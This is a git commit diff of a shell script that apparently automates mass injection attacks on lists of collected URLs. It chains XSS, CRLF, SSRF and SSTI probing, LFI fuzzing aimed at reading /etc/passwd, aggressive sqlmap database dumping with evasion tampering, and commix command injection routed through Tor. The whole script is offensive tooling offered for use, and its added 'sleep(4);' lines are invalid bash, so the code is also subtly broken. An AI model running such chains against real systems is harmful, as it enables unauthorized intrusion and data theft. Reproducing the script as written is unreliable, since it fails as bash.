5003b12a057e4edc16c5a3567862c8692b397667
khaled yassen <79770764+khaledyassen@users.noreply.github.com>
2023-07-26 01:18:43 +0300

    Update Param_Injection.sh

--- Param_Injection.sh
+++ Param_Injection.sh
@@ -10,30 +10,35 @@ cat Endpoints.txt | gf sqli | anew SQL.txt;
 
 # XSS automation
 dalfox file XSS.txt -o XSS_Inject_Response.txt;
-
+sleep(4);
 
 # LFI automation
 cat LFI.txt | qsreplace FUZZ | while read url ; do
-  ffuf -u $url -mr "root:x" -w payloads_wordlist.txt -o LFI_Inject_Response.txt | anew LFI_new_Response.txt
+  ffuf -u $url -t 25 -mr "root:x" -w payloads_wordlist.txt -o LFI_Inject_Response.txt | anew LFI_new_Response.txt
 done
+sleep(4);
 
+# CRLF injection
+crlfuzz -l ALLWithout404.txt | anew CRLF_Inject_Response.txt
 
 # SSRF automation
 cat SSRF.txt | qsreplace "Burp collaborator payload" | while read url ; do
   httpx -u $url --status-code -o SSRF_Inject_Response.txt | anew SSRF_Inject_anew_Response.txt
 done
+sleep(4);
 
 # SSTI injection
 cat SSTI.txt | while read url ; do
   python3 tplmap/tplmap.py -u $url | anew SSTI_Inject_Response.txt
 done
+sleep(4);
 
 # SQL automation
 sqlmap -m SQL.txt --level 5 --risk 3 --batch --dbs --tamper=between | anew SQL_Inject_Response.txt;
+sleep(4);
 
 # OS command injection
 cat OS_Commands.txt | while read url ; do
   python3 commix/commix.py -u $url --tor --hostname | anew Command_Inject_Response.txt
 done
-
 
